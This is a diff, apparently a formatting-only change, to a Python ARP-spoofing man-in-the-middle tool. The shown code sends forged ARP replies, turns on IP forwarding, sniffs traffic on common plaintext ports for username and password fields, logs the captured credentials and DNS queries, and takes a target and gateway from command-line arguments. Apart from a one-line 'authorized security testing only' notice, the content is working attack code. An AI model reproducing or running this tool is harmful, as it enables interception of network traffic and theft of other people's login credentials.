@@ -27,15 +27,27 @@ from utils import require_root, setup_logging, validate_interface, validate_ip
 DEFAULT_CAPTURE_PORTS: list[int] = [80, 8080, 443, 21, 25, 110, 143]
 
 CREDENTIAL_FIELDS: list[str] = [
-    "username", "password", "email", "login", "passwd", "user", "pass",
+    "username",
+    "password",
+    "email",
+    "login",
+    "passwd",
+    "user",
+    "pass",
 ]
 
 
 class MitMAttack:
-    def __init__(self, interface: str, target_ip: str,
-                 gateway_ip: str, output_dir: str = "captures",
-                 timeout: int = 300, forward: bool = True,
-                 capture_ports: Optional[list[int]] = None) -> None:
+    def __init__(
+        self,
+        interface: str,
+        target_ip: str,
+        gateway_ip: str,
+        output_dir: str = "captures",
+        timeout: int = 300,
+        forward: bool = True,
+        capture_ports: Optional[list[int]] = None,
+    ) -> None:
         self.interface: str = interface
         self.target_ip: str = target_ip
         self.gateway_ip: str = gateway_ip
@@ -103,11 +115,9 @@ class MitMAttack:
         packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         send(packet, verbose=False)
 
-    def _restore_arp(self, target_ip: str, spoof_ip: str,
-                     target_mac: str, real_mac: str) -> None:
+    def _restore_arp(self, target_ip: str, spoof_ip: str, target_mac: str, real_mac: str) -> None:
         """Send corrective ARP reply to restore the original mapping."""
-        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
-                     psrc=spoof_ip, hwsrc=real_mac)
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=real_mac)
         send(packet, count=3, verbose=False)
 
     def _spoof_loop(self) -> None:
@@ -171,8 +181,13 @@ class MitMAttack:
             }
             with self._lock:
                 self._captured_credentials.append(credential_entry)
-            self.logger.info("Captured credentials from %s -> %s:%d: %s",
-                             src_ip, dst_ip, dst_port, list(found_fields.keys()))
+            self.logger.info(
+                "Captured credentials from %s -> %s:%d: %s",
+                src_ip,
+                dst_ip,
+                dst_port,
+                list(found_fields.keys()),
+            )
 
     def _extract_dns_query(self, packet) -> None:
         """Log DNS queries from captured traffic."""
@@ -219,8 +234,9 @@ class MitMAttack:
             self.logger.error("Invalid interface: %s", self.interface)
             return
 
-        self.logger.info("Starting MitM attack: target=%s gateway=%s",
-                         self.target_ip, self.gateway_ip)
+        self.logger.info(
+            "Starting MitM attack: target=%s gateway=%s", self.target_ip, self.gateway_ip
+        )
 
         if self.forward:
             self._enable_ip_forwarding()
@@ -243,8 +259,7 @@ class MitMAttack:
         self._start_time = time.time()
         self._stop_event.clear()
 
-        self.logger.info("Target MAC: %s, Gateway MAC: %s",
-                         self._target_mac, self._gateway_mac)
+        self.logger.info("Target MAC: %s, Gateway MAC: %s", self._target_mac, self._gateway_mac)
 
         self._spoof_thread = threading.Thread(target=self._spoof_loop, daemon=True)
         self._spoof_thread.start()
@@ -264,10 +279,12 @@ class MitMAttack:
             # Restore ARP tables
             if self._target_mac and self._gateway_mac:
                 self.logger.info("Restoring ARP tables...")
-                self._restore_arp(self.target_ip, self.gateway_ip,
-                                  self._target_mac, self._gateway_mac)
-                self._restore_arp(self.gateway_ip, self.target_ip,
-                                  self._gateway_mac, self._target_mac)
+                self._restore_arp(
+                    self.target_ip, self.gateway_ip, self._target_mac, self._gateway_mac
+                )
+                self._restore_arp(
+                    self.gateway_ip, self.target_ip, self._gateway_mac, self._target_mac
+                )
                 self.logger.info("ARP tables restored")
         except Exception as e:
             self.logger.error("Error restoring ARP tables: %s", e)
@@ -361,22 +378,25 @@ Note: For authorized security testing only.
         """,
     )
 
-    parser.add_argument("-i", "--interface", required=True,
-                        help="Network interface")
-    parser.add_argument("--target", required=True,
-                        help="Target IP address")
-    parser.add_argument("--gateway", required=True,
-                        help="Gateway IP address")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                        help="Output directory for captured data (default: captures)")
-    parser.add_argument("-t", "--timeout", type=int, default=300,
-                        help="Timeout in seconds (default: 300)")
-    parser.add_argument("--no-forward", action="store_true",
-                        help="Disable IP forwarding")
-    parser.add_argument("-p", "--ports",
-                        help="Comma-separated ports to capture (default: 80,8080,443,21,25,110,143)")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Verbose output")
+    parser.add_argument("-i", "--interface", required=True, help="Network interface")
+    parser.add_argument("--target", required=True, help="Target IP address")
+    parser.add_argument("--gateway", required=True, help="Gateway IP address")
+    parser.add_argument(
+        "-o",
+        "--output-dir",
+        default="captures",
+        help="Output directory for captured data (default: captures)",
+    )
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=300, help="Timeout in seconds (default: 300)"
+    )
+    parser.add_argument("--no-forward", action="store_true", help="Disable IP forwarding")
+    parser.add_argument(
+        "-p",
+        "--ports",
+        help="Comma-separated ports to capture (default: 80,8080,443,21,25,110,143)",
+    )
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
 
     args = parser.parse_args()
     require_root()
